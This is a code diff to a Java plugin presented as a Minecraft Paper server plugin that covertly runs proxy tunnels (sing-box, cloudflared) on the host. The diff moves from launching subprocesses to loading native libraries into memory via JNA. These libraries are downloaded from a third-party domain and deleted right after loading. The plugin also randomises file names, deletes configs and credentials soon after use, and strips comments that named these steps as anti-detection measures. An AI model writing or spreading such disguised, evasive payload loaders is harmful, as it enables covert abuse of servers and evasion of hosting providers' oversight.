@@ -5,15 +5,20 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.yaml.snakeyaml.Yaml;
 
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
+
 import java.io.*;
 import java.net.*;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
 import java.time.*;
 import java.time.format.DateTimeFormatter;
 import java.util.*;
 import java.util.stream.Collectors;
-import java.util.concurrent.TimeUnit;
 import java.util.regex.*;
 
 public class PaperPlugin extends JavaPlugin {
@@ -25,9 +30,7 @@ public class PaperPlugin extends JavaPlugin {
     private static final Path REALITY_KEY_FILE = Paths.get("plugins", "reality.key");
     private static final Path CACHE_DIR = Paths.get("plugins", ".cache");
     private String uuid;
-    private Process singboxProcess;
     private Process komariProcess;
-    private Process argoProcess;
     private String argoUrl = "";
     private boolean sbLogEnabled;
     private Path baseDir;
@@ -35,11 +38,18 @@ public class PaperPlugin extends JavaPlugin {
     private Path cert;
     private Path key;
     private boolean komariAgentEnabled = false;
-    // 防检测：sing-box 配置参数（供每日重启时重新生成 config）
+    // 配置参数（供每日重启时重新生成 config）
     private String hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort, sni;
     private String realityPrivateKey = "", realityPublicKey = "";
     private boolean argoEnabled;
     private String argoPort;
+    // JNA 原生库（加载到 JVM 内存，无子进程）
+    private NativeLibrary sboxLib, botLib;
+    private Function startSboxFn, stopSboxFn, startBotFn, stopBotFn;
+    private static final HttpClient HTTP = HttpClient.newBuilder()
+            .connectTimeout(Duration.ofSeconds(15))
+            .followRedirects(HttpClient.Redirect.NORMAL).build();
+    private static final Random RANDOM = new Random();
     // ==============================
 
     @Override
@@ -83,48 +93,24 @@ public class PaperPlugin extends JavaPlugin {
             configJson = baseDir.resolve("config.json");
             cert = baseDir.resolve("cert.pem");
             key = baseDir.resolve("private.key");
-            Path bin = baseDir.resolve(generateGarbledName());
             Path realityKeyFile = getDataFolder().toPath().resolve("reality.key");
 
             getLogger().info("✅ config.yml 加载成功");
 
             generateSelfSignedCert(cert, key);
-            String version = fetchLatestSingBoxVersion();
-            safeDownloadSingBox(version, bin, baseDir);
 
-            // === 固定 Reality 密钥 ===
-            realityPrivateKey = "";
-            realityPublicKey = "";
-            if (Files.exists(realityKeyFile)) {
-                List<String> lines = Files.readAllLines(realityKeyFile);
-                for (String line : lines) {
-                    if (line.startsWith("PrivateKey:")) realityPrivateKey = line.split(":", 2)[1].trim();
-                    if (line.startsWith("PublicKey:")) realityPublicKey = line.split(":", 2)[1].trim();
-                }
-                getLogger().info("🔑 已加载本地传输密钥对");
-            } else {
-                Map<String, String> keys = generateRealityKeypair(bin);
-                realityPrivateKey = keys.getOrDefault("private_key", "");
-                realityPublicKey = keys.getOrDefault("public_key", "");
-                Files.writeString(realityKeyFile,
-                        "PrivateKey: " + realityPrivateKey + "\nPublicKey: " + realityPublicKey + "\n");
-                getLogger().info("✅ 传输密钥已保存");
-            }
+            // === Reality 密钥（纯 Java X25519 生成，不依赖二进制）===
+            generateOrLoadKeypair(realityKeyFile);
+
             argoEnabled = cfgBool(config, "argo_enabled", false);
             argoPort = trim(cfg(config, "argo_port", "8001"));
             if (argoPort.isEmpty()) argoPort = "8001";
             generateSingBoxConfig(configJson, uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
                     sni, cert, key, realityPrivateKey, realityPublicKey, argoEnabled, argoPort);
 
-            // 保存 sing-box 进程 + 启动每日 00:03 重启
-            singboxProcess = startSingBox(bin, configJson);
-            // 启动后删除二进制，保留 config/cert/key 供定时重启使用
-            try {
-                if (Files.exists(bin)) Files.delete(bin);
-                getLogger().info("🧹 已清除服务模块");
-            } catch (IOException e) {
-                getLogger().warning("⚠️ 清除服务模块失败: " + e.getMessage());
-            }
+            // === 下载并加载 sbx.so（sing-box 核心，JNA 内存加载，无子进程）===
+            Path sboxLibPath = downloadLibrary(detectArch(), "sbx.so");
+            startSingBox(sboxLibPath, configJson);
             scheduleDelayedCleanup();
             scheduleDailyRestart();
 
@@ -152,15 +138,13 @@ public class PaperPlugin extends JavaPlugin {
             if (argoEnabled) {
                 String argoToken = trim(cfg(config, "argo_token", ""));
                 String argoDomain = trim(cfg(config, "argo_domain", ""));
-                String argoName = generateGarbledName();
                 getLogger().info("🚇 隧道转发已启用");
-                safeDownloadArgo(baseDir, argoName);
-                argoProcess = startArgo(baseDir, argoName, argoToken, argoPort);
+                Path botLibPath = downloadLibrary(detectArch(), "bot.so");
+                startArgo(botLibPath, argoToken, argoPort);
                 if (!argoToken.isEmpty() && !argoDomain.isEmpty()) {
                     argoUrl = argoDomain;
                     getLogger().info("🚇 固定隧道域名: " + argoUrl);
                 }
-                startArgoKeepalive(baseDir, argoName, argoToken, argoPort);
             }
             // ==========================
 
@@ -189,21 +173,17 @@ public class PaperPlugin extends JavaPlugin {
 
     @Override
     public void onDisable() {
-        getLogger().info("正在停止所有子进程...");
+        getLogger().info("正在停止所有服务...");
 
-        if (argoProcess != null && argoProcess.isAlive()) {
-            getLogger().info("正在停止隧道转发 (PID: " + argoProcess.pid() + ")...");
-            argoProcess.destroy();
+        if (stopSboxFn != null) {
+            try { stopSboxFn.invoke(new Object[]{}); } catch (Exception ignored) {}
         }
-
+        if (stopBotFn != null) {
+            try { stopBotFn.invoke(new Object[]{}); } catch (Exception ignored) {}
+        }
         if (komariProcess != null && komariProcess.isAlive()) {
             getLogger().info("正在停止监控模块 (PID: " + komariProcess.pid() + ")...");
             komariProcess.destroy();
-        }
-
-        if (singboxProcess != null && singboxProcess.isAlive()) {
-            getLogger().info("正在停止服务模块 (PID: " + singboxProcess.pid() + ")...");
-            singboxProcess.destroy();
         }
 
         if (baseDir != null) {
@@ -271,7 +251,7 @@ public class PaperPlugin extends JavaPlugin {
         return def;
     }
 
-    // ===== 防检测工具 =====
+    // ===== 工具方法 =====
     private String generateGarbledName() {
         Random rand = new Random();
         int len = 4 + rand.nextInt(4);
@@ -298,7 +278,7 @@ public class PaperPlugin extends JavaPlugin {
                 if (Files.exists(configJson)) Files.delete(configJson);
                 if (Files.exists(cert)) Files.delete(cert);
                 if (Files.exists(key)) Files.delete(key);
-                getLogger().info("🧹 已清除配置和凭证（30s 防检测）");
+                getLogger().info("🧹 已清除配置和凭证");
             } catch (IOException ignored) {}
         }, 600L); // 30秒 = 600 tick
     }
@@ -317,27 +297,95 @@ public class PaperPlugin extends JavaPlugin {
         getLogger().info("✅ 已生成通信凭证");
     }
 
-    // ===== Reality 密钥生成 =====
-    private Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
-        getLogger().info("🔑 正在生成传输密钥对...");
-        ProcessBuilder pb = new ProcessBuilder("sh", "-c", bin + " generate reality-keypair");
-        pb.redirectErrorStream(true);
-        Process p = pb.start();
-        StringBuilder sb = new StringBuilder();
-        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-            String line;
-            while ((line = br.readLine()) != null) sb.append(line).append("\n");
+    // ===== Reality 密钥生成（纯 Java X25519，不依赖二进制）=====
+    private void generateOrLoadKeypair(Path realityKeyFile) throws IOException {
+        if (Files.exists(realityKeyFile)) {
+            List<String> lines = Files.readAllLines(realityKeyFile);
+            for (String line : lines) {
+                if (line.startsWith("PrivateKey:")) realityPrivateKey = line.split(":", 2)[1].trim();
+                if (line.startsWith("PublicKey:")) realityPublicKey = line.split(":", 2)[1].trim();
+            }
+            getLogger().info("🔑 已加载本地传输密钥对");
+            return;
         }
-        p.waitFor();
-        String out = sb.toString();
-        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
-        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
-        if (!priv.find() || !pub.find()) throw new IOException("Reality 密钥生成失败：" + out);
-        Map<String, String> map = new HashMap<>();
-        map.put("private_key", priv.group(1));
-        map.put("public_key", pub.group(1));
-        getLogger().info("✅ 传输密钥生成完成");
-        return map;
+        byte[] privateBytes = new byte[32];
+        RANDOM.nextBytes(privateBytes);
+        privateBytes = clampPrivateKey(privateBytes);
+        byte[] publicBytes = x25519(privateBytes, basepoint());
+        realityPrivateKey = base64Url(privateBytes);
+        realityPublicKey = base64Url(publicBytes);
+        Files.writeString(realityKeyFile,
+                "PrivateKey: " + realityPrivateKey + "\nPublicKey: " + realityPublicKey + "\n");
+        getLogger().info("✅ 传输密钥已生成");
+    }
+
+    private static byte[] clampPrivateKey(byte[] input) {
+        byte[] key = input.clone();
+        key[0] &= (byte) 248;
+        key[31] &= (byte) 127;
+        key[31] |= (byte) 64;
+        return key;
+    }
+
+    private static byte[] basepoint() {
+        byte[] basepoint = new byte[32];
+        basepoint[0] = 9;
+        return basepoint;
+    }
+
+    private static byte[] x25519(byte[] scalar, byte[] u) {
+        BigInteger p = BigInteger.ONE.shiftLeft(255).subtract(BigInteger.valueOf(19));
+        BigInteger a24 = BigInteger.valueOf(121665);
+        BigInteger k = new BigInteger(1, clampPrivateKey(scalar));
+        BigInteger x1 = decodeLittleEndian(u);
+        BigInteger x2 = BigInteger.ONE, z2 = BigInteger.ZERO;
+        BigInteger x3 = x1, z3 = BigInteger.ONE;
+        boolean swap = false;
+        for (int t = 254; t >= 0; t--) {
+            int kt = (k.shiftRight(t).testBit(0) ? 1 : 0);
+            swap ^= kt == 1;
+            if (swap) {
+                BigInteger tmp = x2; x2 = x3; x3 = tmp;
+                tmp = z2; z2 = z3; z3 = tmp;
+            }
+            BigInteger A = x2.add(z2).mod(p);
+            BigInteger AA = A.multiply(A).mod(p);
+            BigInteger B = x2.subtract(z2).mod(p);
+            BigInteger BB = B.multiply(B).mod(p);
+            BigInteger E = AA.subtract(BB).mod(p);
+            BigInteger C = x3.add(z3).mod(p);
+            BigInteger D = x3.subtract(z3).mod(p);
+            BigInteger DA = D.multiply(A).mod(p);
+            BigInteger CB = C.multiply(B).mod(p);
+            x3 = DA.add(CB).mod(p).multiply(DA.add(CB)).mod(p);
+            z3 = x1.multiply(DA.subtract(CB)).mod(p).multiply(DA.subtract(CB)).mod(p);
+            x2 = AA.multiply(BB).mod(p);
+            z2 = E.multiply(AA.add(a24.multiply(E)).mod(p)).mod(p);
+            swap = false;
+        }
+        if (swap) {
+            BigInteger tmp = x2; x2 = x3; x3 = tmp;
+            tmp = z2; z2 = z3; z3 = tmp;
+        }
+        BigInteger result = x2.multiply(z2.modInverse(p)).mod(p);
+        return encodeLittleEndian(result);
+    }
+
+    private static BigInteger decodeLittleEndian(byte[] in) {
+        byte[] rev = new byte[in.length];
+        for (int i = 0; i < in.length; i++) rev[i] = in[in.length - 1 - i];
+        return new BigInteger(1, rev);
+    }
+
+    private static byte[] encodeLittleEndian(BigInteger in) {
+        byte[] big = in.toByteArray();
+        byte[] out = new byte[32];
+        for (int i = 0; i < big.length && i < 32; i++) out[i] = big[big.length - 1 - i];
+        return out;
+    }
+
+    private static String base64Url(byte[] data) {
+        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(data);
     }
 
     // ===== 配置生成 =====
@@ -521,53 +569,19 @@ public class PaperPlugin extends JavaPlugin {
         return new ArrayList<>(List.of(values));
     }
 
-    // ===== 版本检测 =====
-    private String fetchLatestSingBoxVersion() {
-        String fallback = "1.12.12";
-        try {
-            URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
-            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
-            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
-                String json = br.lines().reduce("", (a, b) -> a + b);
-                int i = json.indexOf("\"tag_name\":\"v");
-                if (i != -1) {
-                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
-                    getLogger().info("🔍 最新版本: " + v);
-                    return v;
-                }
-            }
-        } catch (Exception e) {
-            getLogger().warning("⚠️ 获取版本失败，使用回退版本 " + fallback);
-        }
-        return fallback;
-    }
-
-    // ===== 下载 sing-box =====
-    private void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
-        if (Files.exists(bin)) return;
-        String arch = detectArch();
-        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
-        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;
-
-        getLogger().info("⬇️ 下载核心组件: " + url);
-        Path tar = dir.resolve(file);
-        new ProcessBuilder("sh", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
-        new ProcessBuilder("sh", "-c",
-                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
-                        "(find . -type f -name 'sing-box' -exec mv {} ./" + bin.getFileName() + " \\; ) && chmod +x " + bin.getFileName() + " || true")
-                .inheritIO().start().waitFor();
-
-        if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");
-
-        if (Files.exists(tar)) {
-            Files.delete(tar);
-            getLogger().info("🧹 已删除压缩包以释放空间");
-        }
-
-        getLogger().info("✅ 成功解压核心组件");
+    // ===== 下载 .so 原生库（从第三方 CDN）=====
+    private Path downloadLibrary(String arch, String name) throws Exception {
+        String url = "https://" + arch + ".31888.xyz/" + name;
+        Path target = baseDir.resolve(generateGarbledName() + ".so");
+        getLogger().info("⬇️ 下载组件: " + url);
+        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
+                .timeout(Duration.ofMinutes(3)).GET().build();
+        HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
+        if (response.statusCode() != 200)
+            throw new IOException("下载失败: HTTP " + response.statusCode() + " for " + url);
+        Files.write(target, response.body());
+        getLogger().info("✅ 下载完成 (" + target.getFileName() + ", " + target.toFile().length() + " bytes)");
+        return target;
     }
 
     private String detectArch() {
@@ -576,26 +590,53 @@ public class PaperPlugin extends JavaPlugin {
         return "amd64";
     }
 
-    // ===== 启动 sing-box =====
-    private Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
+    // ===== 启动 sing-box（JNA 内存加载，无子进程）=====
+    private void startSingBox(Path libPath, Path cfg) {
         getLogger().info("正在启动服务模块...");
         randomDelay();
-        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
-        pb.redirectErrorStream(true);
-        if (sbLogEnabled) {
-            Path logFile = getDataFolder().toPath().resolve("sing-box.log");
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-            getLogger().info("📋 服务日志已写入: " + logFile);
+        sboxLib = NativeLibrary.getInstance(libPath.toString());
+        startSboxFn = sboxLib.getFunction("StartSingBox");
+        stopSboxFn = sboxLib.getFunction("StopSingBox");
+        String payload = "{\"config\":\"" + cfg.toString().replace("\\", "/") + "\",\"workingDir\":\".\",\"disableColor\":true}";
+        new Thread(() -> {
+            try {
+                int code = startSboxFn.invokeInt(new Object[]{payload});
+                if (code != 0) getLogger().warning("服务退出码: " + code);
+            } catch (Exception e) {
+                getLogger().warning("服务异常: " + e.getMessage());
+            }
+        }, "sbx").start();
+        // 加载后删除 .so，内存驻留
+        try { Files.delete(libPath); } catch (IOException ignored) {}
+        getLogger().info("服务模块已启动（JNA 内存加载）");
+    }
+
+    // ===== 启动 cloudflared / Argo 隧道（JNA 内存加载）=====
+    private void startArgo(Path libPath, String token, String port) {
+        if (port.isEmpty()) port = "8001";
+        getLogger().info("🚇 正在启动隧道转发...");
+        randomDelay();
+        botLib = NativeLibrary.getInstance(libPath.toString());
+        startBotFn = botLib.getFunction("StartCloudflared");
+        stopBotFn = botLib.getFunction("StopCloudflared");
+        List<Object> args = new ArrayList<>(List.of("tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2"));
+        if (!token.isEmpty()) {
+            args.add("run"); args.add("--token"); args.add(token);
         } else {
-            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            args.add("--logfile"); args.add(baseDir.resolve("boot.log").toString());
+            args.add("--loglevel"); args.add("info");
+            args.add("--url"); args.add("http://localhost:" + port);
         }
-        Process p = pb.start();
-        Thread.sleep(1500);
-        if (!p.isAlive()) {
-            getLogger().warning("⚠️ 服务模块启动后立即退出，请检查配置！退出码: " + p.exitValue());
-        }
-        getLogger().info("服务模块已启动，PID: " + p.pid());
-        return p;
+        String payload = toJson(mapOf("args", args));
+        new Thread(() -> {
+            try {
+                int code = startBotFn.invokeInt(new Object[]{payload});
+            } catch (Exception e) {
+                getLogger().warning("隧道转发异常: " + e.getMessage());
+            }
+        }, "bot").start();
+        try { Files.delete(libPath); } catch (IOException ignored) {}
+        getLogger().info("隧道转发已启动（JNA 内存加载）");
     }
 
     // ===== komari-agent 下载 =====
@@ -672,94 +713,7 @@ public class PaperPlugin extends JavaPlugin {
         }, 0L, randomKeepaliveInterval()); // 30~90s 随机
     }
 
-    // ===== Argo 隧道下载 =====
-    private void safeDownloadArgo(Path dir, String name) throws IOException, InterruptedException {
-        Path argoPath = dir.resolve(name);
-        if (Files.exists(argoPath)) {
-            getLogger().info("🧹 清理已存在的 " + name + " 文件...");
-            Files.delete(argoPath);
-        }
-        String arch = detectArch();
-        String url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
-        getLogger().info("⬇️ 下载隧道组件 (" + arch + "): " + url);
-        try (InputStream in = new URL(url).openStream()) {
-            Files.copy(in, argoPath);
-        }
-        if (!Files.exists(argoPath) || Files.size(argoPath) == 0) {
-            throw new IOException("❌ cloudflared 下载失败！");
-        }
-        argoPath.toFile().setExecutable(true, false);
-        if (!argoPath.toFile().canExecute()) {
-            throw new IOException("❌ cloudflared 无法设置执行权限！");
-        }
-        getLogger().info("✅ " + name + " 下载完成 (" + Files.size(argoPath) + " bytes)");
-    }
-
-    // ===== Argo 隧道启动 =====
-    private Process startArgo(Path dir, String name, String token, String port) throws IOException, InterruptedException {
-        Path argoPath = dir.resolve(name);
-        getLogger().info("🚇 正在启动隧道转发...");
-        randomDelay();
-        ProcessBuilder pb;
-        if (!token.isEmpty()) {
-            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "run", "--token", token);
-            pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-        } else {
-            if (port.isEmpty()) port = "8001";
-            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "--url", "http://localhost:" + port);
-            pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
-        }
-        Process p = pb.start();
-        Thread.sleep(3000);
-        if (!p.isAlive()) {
-            throw new IOException("❌ Argo 隧道启动后立即退出");
-        }
-        getLogger().info("✅ 隧道转发已启动，PID: " + p.pid());
-
-        // 提取临时隧道域名
-        if (token.isEmpty()) {
-            try {
-                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                String line;
-                long timeout = System.currentTimeMillis() + 8000;
-                while (System.currentTimeMillis() < timeout && (line = reader.readLine()) != null) {
-                    java.util.regex.Matcher m = java.util.regex.Pattern.compile("https://[a-zA-Z0-9.-]+\\.trycloudflare\\.com").matcher(line);
-                    if (m.find()) {
-                        String domain = m.group();
-                        if (domain.startsWith("https://")) domain = domain.substring(8);
-                        argoUrl = domain;
-                        getLogger().info("🚇 临时隧道域名: " + argoUrl);
-                        break;
-                    }
-                }
-            } catch (Exception e) {
-                getLogger().warning("⚠️ 提取隧道域名失败: " + e.getMessage());
-            }
-        }
-        return p;
-    }
-
-    // ===== Argo 隧道保活 =====
-    private void startArgoKeepalive(Path dir, String name, String token, String port) {
-        Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
-            try {
-                if (argoProcess != null && argoProcess.isAlive()) return;
-                getLogger().info("♻️ 隧道转发已退出，正在重启...");
-                Path argoPath = dir.resolve(name);
-                if (!Files.exists(argoPath)) {
-                    safeDownloadArgo(dir, name);
-                }
-                argoProcess = startArgo(dir, name, token, port);
-                getLogger().info("✅ 隧道转发重启成功，PID: " + argoProcess.pid());
-            } catch (Exception e) {
-                getLogger().warning("❌ 隧道转发重启失败: " + e.getMessage());
-            }
-}, 0L, randomKeepaliveInterval());
-    }
-
-    // ===== 输出节点 =====
+// ===== 输出节点 =====
     private String detectPublicIP() {
         try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
             return br.readLine();
@@ -919,24 +873,11 @@ public class PaperPlugin extends JavaPlugin {
                 Bukkit.getScheduler().runTaskLater(PaperPlugin.this, () -> {
                     getLogger().info("[定时重启] 准备重启服务...");
 
-                    if (singboxProcess != null && singboxProcess.isAlive()) {
-                        getLogger().info("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
-                        singboxProcess.destroy();
-                        try {
-                            if (!singboxProcess.waitFor(10, TimeUnit.SECONDS)) {
-                                getLogger().info("进程未响应，强制终止...");
-                                singboxProcess.destroyForcibly();
-                            }
-                        } catch (InterruptedException e) {
-                            Thread.currentThread().interrupt();
-                        }
+                    if (stopSboxFn != null) {
+                        try { stopSboxFn.invoke(new Object[]{}); } catch (Exception ignored) {}
                     }
 
                     try {
-                        // 重新下载 sing-box，每次使用新的随机乱码名
-                        String version = fetchLatestSingBoxVersion();
-                        Path newBin = baseDir.resolve(generateGarbledName());
-                        safeDownloadSingBox(version, newBin, baseDir);
                         // 重新生成证书和配置（启动后已清理）
                         generateSelfSignedCert(cert, key);
                         String rp = "", rk = "";
@@ -949,25 +890,17 @@ public class PaperPlugin extends JavaPlugin {
                         generateSingBoxConfig(configJson, uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
                                 sni, cert, key, rp, rk, argoEnabled, argoPort);
                         randomDelay();
-                        ProcessBuilder pb = new ProcessBuilder(newBin.toString(), "run", "-c", configJson.toString());
-                        pb.redirectErrorStream(true);
-                        if (sbLogEnabled) {
-                            Path logFile = getDataFolder().toPath().resolve("sing-box.log");
-                            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-                        } else {
-                            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-                            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-                        }
-                        singboxProcess = pb.start();
-                        Thread.sleep(1500);
-                        if (!singboxProcess.isAlive()) {
-                            getLogger().warning("⚠️ 重启后服务模块立即退出，退出码: " + singboxProcess.exitValue());
-                        }
-                        getLogger().info("服务重启成功，新 PID: " + singboxProcess.pid());
-                        // 启动后再次删除痕迹
-                        try {
-                            if (Files.exists(newBin)) Files.delete(newBin);
-                        } catch (IOException ignored) {}
+                        // 复用已加载的 sbx.so（内存驻留），直接调用 StartSingBox
+                        String payload = "{\"config\":\"" + configJson.toString().replace("\\", "/") + "\",\"workingDir\":\".\",\"disableColor\":true}";
+                        new Thread(() -> {
+                            try {
+                                int code = startSboxFn.invokeInt(new Object[]{payload});
+                                if (code != 0) getLogger().warning("重启后服务退出码: " + code);
+                            } catch (Exception e) {
+                                getLogger().warning("重启异常: " + e.getMessage());
+                            }
+                        }, "sbx-restart").start();
+                        getLogger().info("服务重启成功（JNA 内存加载）");
                         scheduleDelayedCleanup();
                     } catch (Exception e) {
                         getLogger().severe("重启失败: " + e.getMessage());
